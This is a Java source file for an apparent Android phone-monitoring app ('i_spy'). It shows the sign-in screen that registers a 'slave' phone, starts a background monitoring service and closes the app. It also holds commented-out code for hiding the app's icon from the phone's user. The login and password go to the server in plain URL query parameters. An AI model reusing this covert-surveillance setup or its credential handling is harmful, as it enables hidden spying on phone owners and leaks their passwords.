package com.um.asn.i_spy;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.um.asn.i_spy.http_methods.HttpGetTask;
import com.um.asn.i_spy.services.SlaveService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.ExecutionException;


public class SignInSlaveActivity extends AppCompatActivity {

    String url = Config.SERVER_DOMAIN + "phone";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sign_in_slave);

        Button signInButton = (Button) findViewById(R.id.sign_in_slave_button);

        signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                /* Creation d'un objet HttpPostTask, execution de la methode
                 * doInBackground et recuperation du resultat */
                v.setVisibility(View.INVISIBLE);
                findViewById(R.id.sign_in_slave_progressBar).setVisibility(View.VISIBLE);

                ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

                NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
                if (networkInfo != null && networkInfo.isConnected()) {


                    TextView login = (TextView) findViewById(R.id.sign_in_slave_login);
                    TextView password = (TextView) findViewById(R.id.sign_in_slave_password);

                    if (!login.getText().toString().equals("") && !password.getText().toString().equals("")) {

                        // Construction de l'url REST
                        url += "?phone[login]=" + login.getText().toString() + "&phone[password]=" + password.getText().toString();

                        try {

                            JSONObject replyFromServer = new JSONObject((String) new HttpGetTask()
                                    .execute(new Object[]{url}).get());

                            System.out.println(replyFromServer.toString());

                            if (((boolean) replyFromServer.get("success")) == false) {

                                // Afficher le bouton et cacher la barre de progression
                                v.setVisibility(View.VISIBLE);
                                findViewById(R.id.sign_in_slave_progressBar).setVisibility(View.INVISIBLE);

                                if (replyFromServer.get("message").equals("wrongPhone"))
                                    Toast.makeText(SignInSlaveActivity.this,
                                            R.string.message_sign_in_failed, Toast.LENGTH_LONG).show();
                                else Toast.makeText(SignInSlaveActivity.this,
                                        R.string.message_internal_server_error, Toast.LENGTH_LONG).show();
                            } else {

                                // le retour d'une requete select est un tableau JSON
                                JSONObject obj = (JSONObject) replyFromServer.get("data");

                                /* Ajout dans le fichier phone_info des informations du téléphone
                                   pour l'envoi de l'id et password dans les futures requetes qu'il passera
                                */
                                FileOutputStream phoneInfoStream = openFileOutput(Config.PHONE_INFO, Context.MODE_PRIVATE);
                                phoneInfoStream.write(obj.toString().getBytes());

                                // Pour cacher l'icon de l'application dans la liste des app
                                // Ferme l'app et empêche de la réouvrir...
                                // Il faut la désinstaller et réinstaller
                                /*PackageManager p = getPackageManager();
                                ComponentName componentName = new ComponentName(
                                        RegisterSlaveActivity.this,
                                        com.um.asn.i_spy.ChooseModeActivity.class
                                );
                                p.setComponentEnabledSetting(
                                        componentName,
                                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                        PackageManager.DONT_KILL_APP
                                );*/

                                // Démarre le service
                                Intent slaveService = new Intent(SignInSlaveActivity.this, SlaveService.class);
                                startService(slaveService);

                                // Ferme l'application
                                Intent intent = new Intent(getApplicationContext(), ChooseModeActivity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                intent.putExtra("EXIT", true);
                                startActivity(intent);
                            }

                        } catch (JSONException | InterruptedException | ExecutionException | IOException e) {
                            e.printStackTrace();
                        }

                    } else {
                        // Afficher le bouton et cacher la barre de progression
                        v.setVisibility(View.VISIBLE);
                        findViewById(R.id.sign_in_slave_progressBar).setVisibility(View.INVISIBLE);
                        Toast.makeText(SignInSlaveActivity.this, R.string.message_missing_mandatory_fields, Toast.LENGTH_LONG).show();
                    }
                } else {
                    Toast.makeText(SignInSlaveActivity.this, R.string.message_internet_connection_error, Toast.LENGTH_LONG).show();
                }

            }
        });
    }
}

